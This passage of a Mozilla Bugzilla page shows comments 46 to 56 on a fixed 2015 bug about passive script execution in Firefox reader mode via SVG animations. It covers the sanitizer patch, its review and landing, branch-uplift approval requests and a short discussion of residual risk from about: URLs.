  </div><div class="activity"><div class="change">Group: core-security &rarr; toolkit-core-security</div></div></div><div class="change-set" id="c46"><div class="comment" data-id="10692894" data-no="46"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-46" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a4555756_546015"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a4555756_546015"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-46"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-46" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c46">Comment 46</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-03 10:16 PDT" data-time="1441300573">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-46">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-46" data-comment-id="10692894">(In reply to Gijs Kruitbosch (PTO until Sep 6) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c44">comment #44</a>)
<span class="quote">&gt; Per discussion with Margaret, we think we should just strip everything. This
&gt; is what other browsers (Safari) do, it is the safer option, and the primary
&gt; usecase for reader mode is not watching video.</span >

Agreed!</pre></div><div class="change-set" id="a4678115_428608"><div class="change" id="aa4678115_428608">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a4678115_428608"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_428608" id="a4678115_428608"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a4678115_428608"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a4678115_428608">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a4678115_428608">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-03 10:16 PDT" data-time="1441300589">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(fbraun)</span></div></div></div><div class="change-set" id="c47"><div class="comment" data-id="10710374" data-no="47"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-47" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a4678115_428608"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a4678115_428608"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-47"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-47" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c47">Comment 47</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-09 06:22 PDT" data-time="1441804969">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-47">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8658707"
         class="attachment patch"
         data-id="8658707" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="1182778.txt">
      <meta itemprop="contentSize" content="1975">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8658707">
          <a class="link" href="attachment.cgi?id=8658707&amp;action=diff">
        <span id="att-8658707-description" itemprop="description">Fix nsTreeSanitizer</span></a>
        — <a href="attachment.cgi?id=8658707&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1182778&attachment=8658707">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-47" data-comment-id="10710374">So in the end this was a lot simpler than I thought - we already run the sanitizer on content, so this should Just Work - but as <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c0">comment #0</a> indicated, we should be stripping animate and set elements, too, which we aren't currently. This probably wants uplifting because it will affect other users of the sanitizer that don't pass the &quot;drop media&quot; or &quot;restrict urls to cids only&quot; flags.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(dveditz)</span></div></div></div><div class="change-set" id="a5182536_159069"><div class="change" id="aa5182536_159069">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a5182536_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_159069" id="a5182536_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a5182536_159069"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a5182536_159069">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a5182536_159069">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-09 06:23 PDT" data-time="1441805010">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8658707&amp;action=edit"
           title="Fix nsTreeSanitizer"
           class=""
        >Attachment #8658707</a> -
        Flags: review?(bzbarsky)</div></div></div><div class="change-set" id="a5182760_159069"><div class="change" id="aa5182760_159069">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a5182760_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_159069" id="a5182760_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a5182760_159069"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a5182760_159069">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a5182760_159069">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-09 06:27 PDT" data-time="1441805234">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_NEW"
   title="NEW - Relax restrictions on &lt;animate&gt; and &lt;set&gt; elements in SVG content in nsTreeSanitizer"
   href="/show_bug.cgi?id=1203102">1203102</a></div></div></div><div class="change-set" id="c48"><div class="comment" data-id="10711398" data-no="48"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-48" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_451704" id="a5182760_159069"><img src="https://secure.gravatar.com/avatar/6168ea97fda0cefa449331e59b24e8f7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_451704" id="a5182760_159069"><a class="email " href="/user_profile?user_id=451704" > <span class="fna">Liz Henry (:lizzard Please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-48"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-48" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c48">Comment 48</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-09 10:22 PDT" data-time="1441819346">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-48">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-48" data-comment-id="10711398">Tracking for 43 to keep an eye on this.</pre><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox43&amp;o1=isnotempty">status-firefox43</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox43&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox43&amp;o1=isnotempty">tracking-firefox43</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox43&amp;o1=equals&amp;v1=%2B">+</a></div></div></div><div class="change-set" id="c49"><div class="comment" data-id="10719106" data-no="49"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-49" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_20209" id="a5182760_159069"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_20209" id="a5182760_159069"><a class="email " href="/user_profile?user_id=20209" > <span class="fna">Boris Zbarsky [:bzbarsky]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-49"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-49" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c49">Comment 49</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-10 21:54 PDT" data-time="1441947282">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-49">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-49" data-comment-id="10719106">Comment on <span class=""><a href="/attachment.cgi?id=8658707" name="attach_8658707" title="Fix nsTreeSanitizer">attachment 8658707</a> <a href="/attachment.cgi?id=8658707&amp;action=edit" title="Fix nsTreeSanitizer">[details]</a> <a href="/attachment.cgi?id=8658707&amp;action=diff" title="Fix nsTreeSanitizer">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1182778&amp;attachment=8658707'>[review]</a>
Fix nsTreeSanitizer

r=me</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8658707&amp;action=edit"
           title="Fix nsTreeSanitizer"
           class=""
        >Attachment #8658707</a> -
        Flags: review?(bzbarsky) &rarr; review+</div></div></div><div class="change-set" id="c50"><div class="comment" data-id="10720338" data-no="50"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-50" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a5182760_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a5182760_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-50"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-50" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c50">Comment 50</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-11 05:55 PDT" data-time="1441976126">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-50">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-50" data-comment-id="10720338"><a rel="nofollow" href="https://hg.mozilla.org/integration/fx-team/rev/c3df6435ad5e">https://hg.mozilla.org/integration/fx-team/rev/c3df6435ad5e</a></pre></div><div class="change-set" id="c51"><div class="comment" data-id="10724306" data-no="51"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-51" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_135518" id="a5182760_159069"><img src="https://secure.gravatar.com/avatar/2b6c1ba0915a97a81d59ca1e101e6d74?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_135518" id="a5182760_159069"><a class="email " href="/user_profile?user_id=135518" > <span class="fna">Phil Ringnalda (:philor)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-51"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-51" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c51">Comment 51</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-12 09:24 PDT" data-time="1442075042">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-51">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-51" data-comment-id="10724306"><a rel="nofollow" href="https://hg.mozilla.org/mozilla-central/rev/c3df6435ad5e">https://hg.mozilla.org/mozilla-central/rev/c3df6435ad5e</a></pre><div class="activity"><div class="change">Status: ASSIGNED &rarr; RESOLVED</div><div class="change">Closed: <span class="rel-time" title="2015-09-12 09:24 PDT" data-time="1442075042">6 years ago</span></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox43&amp;o1=isnotempty">status-firefox43</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox43&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox43&amp;o1=equals&amp;v1=fixed">fixed</a></div><div class="change">Resolution: --- &rarr; FIXED</div><div class="change">Target Milestone: --- &rarr; mozilla43</div></div></div><div class="change-set" id="c52"><div class="comment" data-id="10724382" data-no="52"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-52" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a5182760_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a5182760_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-52"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-52" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c52">Comment 52</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-12 10:32 PDT" data-time="1442079152">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-52">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-52" data-comment-id="10724382">Comment on <span class=""><a href="/attachment.cgi?id=8658707" name="attach_8658707" title="Fix nsTreeSanitizer">attachment 8658707</a> <a href="/attachment.cgi?id=8658707&amp;action=edit" title="Fix nsTreeSanitizer">[details]</a> <a href="/attachment.cgi?id=8658707&amp;action=diff" title="Fix nsTreeSanitizer">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1182778&amp;attachment=8658707'>[review]</a>
Fix nsTreeSanitizer

Approval Request Comment
[Feature/regressing bug #]: limited scope security issue with scripts running in reader mode where they shouldn't be.
[User impact if declined]: idem
[Describe test coverage new/current, TreeHerder]: limited existing test cover
[Risks and why]: this may break some content that passes through the sanitizer. That is necessary (short-term) to fix the issue at hand. I don't expect much real content to be affected by this, as inline SVG use on the web is fairly limited, and Chrome has already deprecated SMIL, suggesting developers use CSS instead.
[String/UUID change made/needed]: none.

I'm asking for ESR approval because I expect that the sanitizer gets invoked from mailnews as well, and potentially by add-ons. I realize this is late in the cycle, and I am not an expert on the web risk for SVG here, but &quot;rather safe than sorry&quot; seems like a sensible approach here. bz, does that make sense to you as well or do you think I am overstating the case / underestimating the risk?</pre><div class="activity"><div class="change">Flags: needinfo?(bzbarsky)</div><div class="change">
        <a href="/attachment.cgi?id=8658707&amp;action=edit"
           title="Fix nsTreeSanitizer"
           class=""
        >Attachment #8658707</a> -
        Flags: approval-mozilla-esr38?</div><div class="change">
        <a href="/attachment.cgi?id=8658707&amp;action=edit"
           title="Fix nsTreeSanitizer"
           class=""
        >Attachment #8658707</a> -
        Flags: approval-mozilla-beta?</div><div class="change">
        <a href="/attachment.cgi?id=8658707&amp;action=edit"
           title="Fix nsTreeSanitizer"
           class=""
        >Attachment #8658707</a> -
        Flags: approval-mozilla-aurora?</div></div></div><div class="change-set" id="c53"><div class="comment" data-id="10724385" data-no="53"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-53" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a5182760_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a5182760_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-53"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-53" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c53">Comment 53</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-12 10:36 PDT" data-time="1442079366">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-53">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-53" data-comment-id="10724385">Comment on <span class=""><a href="/attachment.cgi?id=8643570" name="attach_8643570" title="Patch v3">attachment 8643570</a> <a href="/attachment.cgi?id=8643570&amp;action=edit" title="Patch v3">[details]</a> <a href="/attachment.cgi?id=8643570&amp;action=diff" title="Patch v3">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1182778&amp;attachment=8643570'>[review]</a>
Patch v3

Approval Request Comment
[Feature/regressing bug #]: reader mode
[User impact if declined]: reader mode redirect spoofing security issues
[Describe test coverage new/current, TreeHerder]: minor existing test coverage
[Risks and why]: low, has baked for a long time, might cause brokenness when opening websites in reader mode that don't redirect sanely (ie which would already be broken outside reader mode). 
[String/UUID change made/needed]: no.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8643570&amp;action=edit"
           title="Patch v3"
           class=""
        >Attachment #8643570</a> -
        Flags: approval-mozilla-beta?</div><div class="change">
        <a href="/attachment.cgi?id=8643570&amp;action=edit"
           title="Patch v3"
           class=""
        >Attachment #8643570</a> -
        Flags: approval-mozilla-aurora?</div></div></div><div class="change-set" id="c54"><div class="comment" data-id="10724968" data-no="54"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-54" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_20209" id="a5182760_159069"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_20209" id="a5182760_159069"><a class="email " href="/user_profile?user_id=20209" > <span class="fna">Boris Zbarsky [:bzbarsky]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-54"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-54" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c54">Comment 54</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-12 17:55 PDT" data-time="1442105707">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-54">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-54" data-comment-id="10724968">I think this is reasonably low risk except for people doing copy/paste of SVG.  That part worries me a bit.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(bzbarsky)</span></div></div></div><div class="change-set" id="c55"><div class="comment" data-id="10726384" data-no="55"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-55" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a5182760_159069"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a5182760_159069"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-55"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-55" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c55">Comment 55</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-13 23:49 PDT" data-time="1442213346">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-55">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-55" data-comment-id="10726384">Thinking over these bits again..

(In reply to Daniel Veditz [:dveditz] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c42">comment #42</a>)
<span class="quote">&gt; …
&gt; When you put the content into an about:something URL it gets different
&gt; powers than we've thought through. For instance it can link to or frame
&gt; &quot;about:config&quot;, a chrome-privileged window. We've had several
&gt; vulnerabilities in the past that were mitigated by the inability of web
&gt; content to link to or otherwise manipulate a chrome-privileged window. It's
&gt; not same-origin and it /should/ be safe, but we've had many vulnerabilities
&gt; that this kind of set up turned from a same-origin violation into arbitrary
&gt; code execution. That argues for sanitizing the content within an inch of its
&gt; life.
&gt; 
&gt; What's the alternative? Trying to copy over the CSP (converting 'self' to
&gt; the original origin, modifying directives like style-src that get in your
&gt; way) would protect against this case where the script wasn't supposed to be
&gt; there, that it's an attack from some 3rd party on the page. It would not,
&gt; however, protect against a malicious page trying to use about:reader to
&gt; crack Firefox open -- such a page would simply avoid having a CSP.
&gt; </span >

...I am not sure if we already want to close this bug. Though I want to note that the reader mode currently removes links to the about scheme.</pre></div><div class="change-set" id="a5596536_495955"><div class="change" id="aa5596536_495955">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_495955" id="a5596536_495955"><img src="https://secure.gravatar.com/avatar/5aa2e382197a147b42d020b6878f8623?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_495955" id="a5596536_495955"><a class="email " href="/user_profile?user_id=495955" > <span class="fna">Sylvestre Ledru [:Sylvestre]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a5596536_495955"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a5596536_495955">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a5596536_495955">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-14 01:23 PDT" data-time="1442219010">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox42&amp;o1=isnotempty">status-firefox42</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox42&amp;o1=equals&amp;v1=affected">affected</a></div></div></div><div class="change-set" id="a5596833_495955"><div class="change" id="aa5596833_495955">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_495955" id="a5596833_495955"><img src="https://secure.gravatar.com/avatar/5aa2e382197a147b42d020b6878f8623?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_495955" id="a5596833_495955"><a class="email " href="/user_profile?user_id=495955" > <span class="fna">Sylvestre Ledru [:Sylvestre]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a5596833_495955"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a5596833_495955">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a5596833_495955">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-14 01:28 PDT" data-time="1442219307">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox41&amp;o1=isnotempty">status-firefox41</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox41&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr38&amp;o1=isnotempty">status-firefox-esr38</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr38&amp;o1=equals&amp;v1=affected">affected</a></div></div></div><div class="change-set" id="c56"><div class="comment" data-id="10726540" data-no="56"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-56" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_495955" id="a5596833_495955"><img src="https://secure.gravatar.com/avatar/5aa2e382197a147b42d020b6878f8623?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_495955" id="a5596833_495955"><a class="email " href="/user_profile?user_id=495955" > <span class="fna">Sylvestre Ledru [:Sylvestre]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-56"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-56" >
        <td>
